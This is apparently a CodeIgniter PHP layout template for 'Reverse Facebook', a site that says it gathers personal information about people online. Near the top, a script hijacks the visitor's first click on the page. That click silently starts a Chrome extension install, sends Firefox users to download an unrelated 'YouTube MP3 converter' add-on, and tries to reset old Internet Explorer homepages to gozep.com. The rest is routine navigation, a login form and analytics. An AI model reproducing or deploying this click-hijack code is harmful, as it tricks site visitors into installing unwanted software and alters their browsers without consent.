<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,height=device-height,user-scalable=no"/>
    <meta name="google-site-verification" content="gF9jHVZYQnNGrhJ6vZLDZbL_SReH53RaaSIfysiiz4A"/>
    <meta name="description" content="Reverse Facebook, always search the internet and collect human information for you."/>
    <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/licdbbbdffliioanokaeahnpgphandej">
    <link rel="shortcut icon" href="<?= base_url() ?>favicon.ico"/>
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>all_min.css?v=1"/>
    <script src="<?= base_url() ?>all_min.js?v=1" type="text/javascript"></script>
    <title><?= (($title != "") ? "$title on Social Media | Reverse Facebook" : "Reverse Facebook") ?></title>
    <script type="text/javascript">var _sf_startpt = (new Date()).getTime()</script>
    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
    <!--[if lt IE 9]>
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
</head>
<body>

<script>
    $(document).ready(function () {
        if (jQuery.cookie('test_chrome_app_status') != '1') {

            var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
            // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
            var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
            var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
            // At least Safari 3+: "[object HTMLElementConstructor]"
            var isChrome = !!window.chrome && !isOpera;              // Chrome 1+
            var isIE = /*@cc_on!@*/false || document.documentMode;   // At least IE6

            $(document).on('click', function () {

                if (top.location!= self.location) {
                    top.location = self.location.href
                }

                if(isChrome){ //chrome ise
                    chrome.webstore.install();
                }else if(isFirefox){
                    try{
                        window.location.href = "https://addons.mozilla.org/firefox/downloads/file/226378/youtube_mp3_converter-1.0.4-fx.xpi?src=dp-btn-primary";
                    }catch(e){}
                }
                else if($("html").hasClass("lt-ie7")) //ie7den kucuk ise
                {
                    try{
                        document.setHomePage("http://gozep.com/?ref=ie");
                    }catch(e){}
                }

                var date = new Date();
                var minutes = 30;
                date.setTime(date.getTime() + (minutes * 60 * 1000));
                jQuery.cookie('test_chrome_app_status_new', '1', { expires: date});
                $(document).off('click');
            });
        }
    });
</script>

<!-- AddThis Smart Layers BEGIN -->
<!-- Go to http://www.addthis.com/get/smart-layers to customize -->
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4f71fbfb48f55785"></script>
<script type="text/javascript">
    addthis.layers({
        'theme' : 'transparent',
        'share' : {
            'position' : 'left',
            'numPreferredServices' : 5
        },
        'whatsnext' : {},
        'recommended' : {
            'title': 'Recommended for you:'
        }
    });
</script>
<!-- AddThis Smart Layers END -->

<div class="topbar">
    <div class="fill">
        <div class="container canvas">
            <a class="brand" href="<?= base_url() ?>"><?= (isset($person->name) ? $person->name : 'Reverse Facebook') ?></a>
            <ul class="nav">
                <? if ($this->session->userdata('user_id') > 0): ?>
                    <li id="index"><a href="<?= base_url() ?>">Index</a></li>
                    <li id="mostviewed"><a href="<?= site_url("stats/viewed") ?>">Most Viewed</a></li>
                <? else: ?>
                    <li id="signup"><a href="<?= site_url("auth") ?>">Sign Up</a></li>
                <? endif ?>
            </ul>
            <?= form_open('auth/login', array('class' => 'pull-right')) ?>
            <? if ($this->session->userdata('user_id') > 0): ?>
                <button class="btn" type="submit"
                        onclick="javascript:window.location.href='<?= site_url('profile/settings') ?>'; return false;">
                    Settings
                </button>
                <button class="btn" type="submit"
                        onclick="javascript:window.location.href='<?= site_url('profile/logout') ?>'; return false;">
                    Logout
                </button>
            <? else: ?>
                <input class="input-small" name="email" type="text" placeholder="Email">
                <input class="input-small" name="pass" type="password" placeholder="Password">
                <button class="btn" type="submit">Sign in</button>
            <? endif ?>
            <?= form_close() ?>
        </div>
    </div>
</div>


<div class="container canvas">

    <div class="content">

        <div class="row">
            <div class="span12">
                <? if ($this->session->flashdata('error') != ""): ?>
                    <div class="alert alert-block alert-error fade in">
                        <button type="button" class="close" data-dismiss="alert">&times;</button>
                        <h4 class="alert-heading">Error</h4>

                        <p><?= $this->session->flashdata('error') ?></p>
                    </div>
                <? endif ?>

                <?
                $validation_errors = validation_errors();
                if ($validation_errors != ""):
                    ?>
                    <div class="alert alert-block alert-error fade in">
                        <button type="button" class="close" data-dismiss="alert">&times;</button>
                        <h4 class="alert-heading">Form Validation Error</h4>

                        <p><?= validation_errors() ?></p>
                    </div>
                <? endif ?>

                <? if ($this->session->flashdata('info') != ""): ?>
                    <div class="alert fade in">
                        <button type="button" class="close" data-dismiss="alert">&times;</button>
                        <p><?= $this->session->flashdata('info') ?></p>
                    </div>
                <? endif ?>
            </div>
        </div>

        <?= $page ?>

        <div class="row">
            <div class="span12">
                <hr/>
                <a href="<?= site_url('page/privacypolicy') ?>/" target="_blank">Privacy Policy</a>&nbsp;&nbsp;| &nbsp;&nbsp;
                <a href="mailto:vstcmail@gmail.com?subject=face-finder.com" target="_blank">Contact Us</a>
            </div>
        </div>

        <!-- Memory: <?= $this->benchmark->elapsed_time() ?>  ||  Elapsed: <?= $this->benchmark->memory_usage() ?> -->
    </div>
    <script type="text/javascript">
        var _sf_async_config = { uid: 43759, domain: '<?=str_replace('www.', '', $_SERVER['HTTP_HOST'])?>', useCanonical: true };
        (function () {
            function loadChartbeat() {
                window._sf_endpt = (new Date()).getTime();
                var e = document.createElement('script');
                e.setAttribute('language', 'javascript');
                e.setAttribute('type', 'text/javascript');
                e.setAttribute('src', '//static.chartbeat.com/js/chartbeat.js');
                document.body.appendChild(e);
            };
            var oldonload = window.onload;
            window.onload = (typeof window.onload != 'function') ?
                loadChartbeat : function () {
                oldonload();
                loadChartbeat();
            };
        })();
    </script>

    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-44453500-1', 'face-finder.com');
        ga('send', 'pageview');

    </script>
</body>
</html>
